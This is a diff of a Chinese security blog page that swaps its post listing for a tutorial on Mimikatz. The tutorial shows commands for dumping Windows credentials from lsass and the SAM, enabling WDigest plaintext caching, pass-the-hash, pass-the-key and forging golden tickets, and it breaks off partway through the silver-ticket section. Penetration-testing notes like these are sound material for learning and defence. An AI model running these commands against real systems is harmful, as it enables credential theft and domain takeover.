@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>不过是块石头而已</title>
+  <title>Mimikatz原理和使用 | 不过是块石头而已</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="不过是块石头而已">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="Mimikatz使用手册原理：      当用户登陆后,会把账号密码保存在 Isass中，Isass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mimikatz原理和使用">
+<meta property="og:url" content="http://example.com/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/index.html">
 <meta property="og:site_name" content="不过是块石头而已">
+<meta property="og:description" content="Mimikatz使用手册原理：      当用户登陆后,会把账号密码保存在 Isass中，Isass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-25T06:33:52.000Z">
+<meta property="article:modified_time" content="2022-04-29T06:44:26.784Z">
 <meta property="article:author" content="lam">
+<meta property="article:tag" content="工具">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="不过是块石头而已" type="application/atom+xml">
@@ -150,473 +155,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-MySQL渗透相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Mimikatz原理和使用" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">MySQL渗透相关</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2022-04-29T06:20:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Mysql渗透相关"><a href="#Mysql渗透相关" class="headerlink" title="Mysql渗透相关"></a>Mysql渗透相关</h3><p>Mysql相关</p>
-        
-          <a class="article-more-a" href="/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Dont-hit-without-hesitation" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/27/Dont-hit-without-hesitation/">Dont hit without hesitation</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/27/Dont-hit-without-hesitation/" class="archive-article-date">
-  	<time datetime="2022-04-27T07:22:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>许多年没碰github，心血来潮，重新部署，打算将这几年编写和收藏的markdown发上去~</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/27/Dont-hit-without-hesitation/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/27/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/27/hello-world/" class="archive-article-date">
-  	<time datetime="2022-04-27T07:10:28.422Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/27/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Windows核心编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/20/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/">Windows核心编程</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/20/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/" class="archive-article-date">
-  	<time datetime="2022-04-20T11:12:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="windows核心编程"><a href="#windows核心编程" class="headerlink" title="windows核心编程"></a>windows核心编程</h1><h3 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h3><pre><code class="C">BOOL CreateProcess(
-    LPCWSTR lpApplicationName, 					//文件名 完整文件路径，如记事本c://XX//XX//notepad.exe
-    LPWSTR lpCommandLine, 						//命令行参数
-    LPSECURITY_ATTRIBUTES lpProcessAttributes, 	//SD 进程句柄
-    LPSECURITY_ATTRIBUTES lpThreadAttributes, 	//SD 线程句柄
-    BOOL bInheritHandles, 						//句柄是否可继承
-    DWORD dwCreationFlags, 						//创建进程方式
-    LPVOID lpEnvironment, 						//父进程环境变量
-    LPCWSTR lpCurrentDirectory, 				//子进程工作路径
-    LPSTARTUPINFOW lpStartupInfo, 				//启动进程相关信息
-    LPPROCESS_INFORMATION lpProcessInformation	//子进程的相关信息 (进程ID,线程ID,进程句柄,线程句柄)
-);											
-</code></pre>
-<p> 一般注意的是CreateProcess()的前两个参数和后两个参数。</p>
-<p>第一个<code>lpApplicationName</code>启动进程的**<code>绝对路径</code>**，比如计算器路径为：<code>C:\Windows\System32\calc.exe</code>。</p>
-<p>第二个<code>lpCommandLine</code>对命令行进行传参。 </p>
-        
-          <a class="article-more-a" href="/2022/04/20/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">免杀</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/20/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-fastjson相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/15/fastjson%E7%9B%B8%E5%85%B3/">fastjson相关</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/15/fastjson%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2022-03-15T05:47:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Fastjson-漏洞相关"><a href="#Fastjson-漏洞相关" class="headerlink" title="Fastjson 漏洞相关"></a>Fastjson 漏洞相关</h1><p>FastJSON 漏洞分析</p>
-        
-          <a class="article-more-a" href="/2022/03/15/fastjson%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/15/fastjson%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-linux应急响应" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/01/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">linux应急响应</a>
-    </h1>
-  
-
-        
-        <a href="/2022/03/01/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="archive-article-date">
-  	<time datetime="2022-03-01T06:04:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>记录一下Linux应急响应的大致思路和流程。</p>
-        
-          <a class="article-more-a" href="/2022/03/01/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">应急响应</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/01/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Mimikatz原理和使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/">Mimikatz原理和使用</a>
+    <h1 class="article-title" itemprop="name">
+      Mimikatz原理和使用
     </h1>
   
 
@@ -633,256 +179,223 @@
 
     当用户登陆后,会把账号密码保存在 Isass中，Isass是微软 Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在lsass内存中，经过其 Wdigest和 tspg两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中，而mimikatz正是通过对lsass的逆算获取到明文密码
 </code></pre>
-        
-          <a class="article-more-a" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/#more">more >></a>
-        
-      
+<span id="more"></span>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<p>Mimikatz是一款功能强大的轻量级框架，常用于内网渗透中的横向渗透和权限维持阶段。</p>
+<p>该工具的大部分操作都至少需要系统管理员权限，所以要先提权为debug权限。</p>
+<h4 id="一、获取本地账户密码"><a href="#一、获取本地账户密码" class="headerlink" title="一、获取本地账户密码"></a>一、获取本地账户密码</h4><h5 id="1-本地执行抓取密码"><a href="#1-本地执行抓取密码" class="headerlink" title="1. 本地执行抓取密码"></a>1. 本地执行抓取密码</h5><p>以管理员权限打开Mimikatz.exe，从<code>lsass.exe</code>进程中直接获取密码：</p>
+<pre><code class="shell">#获取debug权限，需要管理员权限
+privilege::debug  
 
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/25/Mimikatz%E5%8E%9F%E7%90%86%E5%92%8C%E4%BD%BF%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-内网渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-    </h1>
-  
-
-        
-        <a href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="archive-article-date">
-  	<time datetime="2022-01-10T05:41:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>《内网安全攻防——渗透测试实战指南》笔记</p>
-        
-          <a class="article-more-a" href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">内网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-nmap相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/">nmap相关</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2021-07-14T05:49:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap 使用方法、小技巧</p>
-        
-          <a class="article-more-a" href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/14/nmap%E7%9B%B8%E5%85%B3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-汇编相关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/">汇编相关</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/" class="archive-article-date">
-  	<time datetime="2020-04-29T06:41:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><pre><code>|-寻址
-|-寄存器*
-|-调用约定**
+#获取密码
+sekurlsa::logonpasswords
 </code></pre>
-<h2 id="寻址模式"><a href="#寻址模式" class="headerlink" title="寻址模式"></a>寻址模式</h2><ol>
-<li><p>立即数寻址	     eg.: mov eax,1000h    操作数在指令中</p>
-</li>
-<li><p>寄存器寻址         eg. :mov ebp,esp        操作数在指定寄存器中</p>
-</li>
-<li><p>直接内存寻址     eg.: mov ax,[2000h]    操作数在内存中</p>
-</li>
-<li><p>寄存器间接寻址 eg.: mov eax,[ebx]       操作数在内存中，操作数的地址在寄存器中</p>
-</li>
-<li><p>索引寻址             eg.: mov ax,[di+100h] 通过基址寄存器内容加上一个索引值来寻址内存中的数据</p>
-</li>
-<li><p>相对基址索引寻址eg.: mov dh,[bx+si+10h]  基址寄存器+变址寄存器内容+偏移量</p>
-</li>
-<li><p>比例寻址变址      eg.: mov eax,[ebx+4*ecx]</p>
-        
-          <a class="article-more-a" href="/2020/04/29/%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3/#more">more >></a>
-        
+<p>当目标主机版本为<strong>Windows2012</strong>之后（<code>Wdigest</code>默认关闭），或打了<code>KB2871997</code>补丁，</p>
+<p>则无法直接获取明文密码。</p>
+<p>此时可以尝试利用注册表开启<code>Wdigest Auth</code>，再抓取密码；或用hash传递攻击。</p>
+<pre><code class="shell">#查看wdigest的状态
+sekurlsa::wdigest
+
+#cmd修改注册表，开启Wdigest Auth
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+#重启或用户重新登录后可抓取密码
+</code></pre>
+<h5 id="2-利用sam数据库获取密码"><a href="#2-利用sam数据库获取密码" class="headerlink" title="2. 利用sam数据库获取密码"></a>2. 利用sam数据库获取密码</h5><p>用户账户以及密码经过Hash加密之后，都保存在sam数据库中 。</p>
+<p>sam文件一般位置:<code>C:\Windows\System32\config\SAM</code>。</p>
+<p>先导出sam表：</p>
+<pre><code class="shell">#管理员身份打开的cmd中执行 
+reg save HKLM\SYSTEM SYSTEM #导出sam数据
+reg save HKLM\SAM SAM       #导出sam数据
+</code></pre>
+<p>使用mimikatz提取hash：</p>
+<pre><code class="shell">lsadump::sam /sam:SAM /system:SYSTEM
+</code></pre>
+<h5 id="3-Procdump导出并读取密码"><a href="#3-Procdump导出并读取密码" class="headerlink" title="3. Procdump导出并读取密码"></a>3. Procdump导出并读取密码</h5><p>由于免杀原因，Mimikatz一般无法在目标主机上直接运行时，可用procdump导出<code>lsass.dmp</code>文件，然后用Mimikatz从该文件中获取密码。</p>
+<pre><code class="shell">#导出lsass.dmp文件
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+#再利用mimikatz从lsass.dmp文件中获取密码
+privilege::debug
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+</code></pre>
+<h4 id="二、哈希传递攻击PTH"><a href="#二、哈希传递攻击PTH" class="headerlink" title="二、哈希传递攻击PTH"></a>二、哈希传递攻击PTH</h4><p>PTH，即直接通过LM Hash和NTLM hash访问远程主机或服务。</p>
+<p>如果禁用了NTLM认证，使用Mimikatz依然可以攻击成功。</p>
+<p>当主机打了<code>KB2871997</code>补丁，则Mimikatz的PTH攻击只能攻击<strong>administrator用户。</strong></p>
+<h5 id="1-工作组环境"><a href="#1-工作组环境" class="headerlink" title="1. 工作组环境"></a>1. 工作组环境</h5><p>当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。</p>
+<pre><code class="shell">sekurlsa::pth /user:主机名 /domain:主机ip /ntlm:hash值
+</code></pre>
+<p>攻击成功会弹出cmd窗口，该cmd窗口与目标主机相当于建立IPC链接，可直接使用相关操作命令。</p>
+<h5 id="2-域环境"><a href="#2-域环境" class="headerlink" title="2. 域环境"></a>2. 域环境</h5><p>当我们拥有一台域内主机的本地administrator权限，并获得了域用户的NTLM hash值。</p>
+<pre><code class="shell">sekurlsa::pth /user:test /domain:test.com /ntlm:xxxxxxxxxxxxx
+</code></pre>
+<h5 id="3-msf远程hash"><a href="#3-msf远程hash" class="headerlink" title="3. msf远程hash"></a>3. msf远程hash</h5><p>当获取某台主机administrator用户的hash值，且该主机445端口开放，也可以用msf中的<code>exploit/windows/smb/psexec</code> 进行远程hash攻击。</p>
+<h4 id="三、密钥传递攻击PTK"><a href="#三、密钥传递攻击PTK" class="headerlink" title="三、密钥传递攻击PTK"></a>三、密钥传递攻击PTK</h4><p>PTK是在域中攻击kerberos认证的一种方式。</p>
+<p>对于打了<code>KB2871997</code>补丁的Windows7&#x2F;2008R2&#x2F;8&#x2F;2012等，可以用AES keys代替 NTLM hash实现PTK攻击。</p>
+<pre><code class="shell">#PTK - AES256传递攻击
+sekurlsa::ekeys  #获取AES
+sekurlsa:pth /user:用户名 /domain:域名 /aes256:aes值
+</code></pre>
+<p>wmiexec同样支持PTK攻击。</p>
+<p>总结：KB2871997补丁后的影响（systeminfo可以查看补丁信息）</p>
+<pre><code>pth：没打补丁用户都可以连接，打了补丁只能administrator连接
+ptk：打了补丁才能用户都可以连接，采用aes256连接
+</code></pre>
+<h4 id="四、票据传递攻击PTT"><a href="#四、票据传递攻击PTT" class="headerlink" title="四、票据传递攻击PTT"></a>四、票据传递攻击PTT</h4><p>PTT攻击一般用于拿下域控后的<strong>权限维持</strong>。</p>
+<h5 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="1. 黄金票据"></a>1. 黄金票据</h5><p><strong>原理</strong>：域中每个用户的 Ticket 都是由 <code>krbtgt</code>的密码Hash来计算生成的，因此只要获取到了krbtgt用户的密码Hash，就可以随意伪造 Ticket，进而使用 Ticket 登陆域控。使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket（黄金票据）。</p>
+<p>首先获取krbtgt的用户hash：</p>
+<pre><code class="shell">mimikatz &quot;lsadump::dcsync /domain:test.com /user:krbtgt&quot;
+</code></pre>
+<p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值：</p>
+<pre><code class="shell">kerberos::golden /admin:administrator /domain:test.com /sid:S-x-x-x-x /krbtgt:Hash值 /ticket:test.kiribi
+</code></pre>
+<p>导入生成的黄金票据：</p>
+<pre><code class="shell">kerberos::ptt test.kiribi
+</code></pre>
+<p>导入成功即获得域管理员权限。</p>
+<h5 id="2-白银票据"><a href="#2-白银票据" class="headerlink" title="2. 白银票据"></a>2. 白银票据</h5><p>伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信。</p>
+<pre><code class="shell">#在域控上导出 DC$ 的 HASH
+mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;
+
+#利用 DC$ 的 Hash制作一张 cifs 服务的白银票据
